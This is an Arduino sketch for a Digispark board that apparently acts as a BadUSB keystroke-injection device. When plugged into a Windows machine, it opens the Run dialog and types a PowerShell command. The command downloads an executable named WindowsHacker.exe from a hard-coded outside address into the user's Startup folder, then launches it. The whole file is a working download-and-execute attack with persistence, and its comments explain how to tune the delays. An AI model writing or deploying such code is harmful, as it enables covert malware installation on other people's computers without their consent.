#include "DigiKeyboard.h"
#define KEY_UP_ARROW     0x52
#define KEY_DOWN_ARROW   0x51
#define KEY_LEFT_ARROW   0x50
#define KEY_RIGHT_ARROW  0x4F
#define KEY_LEFT_GUI     0xE3
#define KEY_ESC          0x29
#define KEY_HOME         0x4A
#define KEY_INSERT       0x49
#define KEY_NUM_LOCK     0x53
#define KEY_SCROLL_LOCK  0x47
#define KEY_CAPS_LOCK  0x39
#define KEY_TAB          0x2B

void digiBegin() {
  DigiKeyboard.sendKeyStroke(0,0);
  DigiKeyboard.delay(50);
}

void digiEnd() {
  const int led=1;
  pinMode(led, OUTPUT);
  while (1) {
    digitalWrite(led, !digitalRead(led));
    DigiKeyboard.delay(1000);
  }
}

void printText(fstr_t *txt) {
  DigiKeyboard.print(txt);
  DigiKeyboard.update();
}

void setup() {
  digiBegin();
  // You can remove this Delay line in the beginning (I just rather having it just in case)
  DigiKeyboard.delay(600);
  // open the Run
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  // Change this value depending on the computer you are using ( i mean slow or not )
  DigiKeyboard.delay(100);
  printText(F("powershell  $source = 'http://192.168.3.23:8082/key/WindowsHacker.exe'; $destination =  '%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\b.exe'; Invoke-WebRequest $source -OutFile $destination;")); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  printText(F("powershell start-process %AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\b.exe"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  printText(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digiEnd();
}

/* Unused endless loop */
void loop() {}
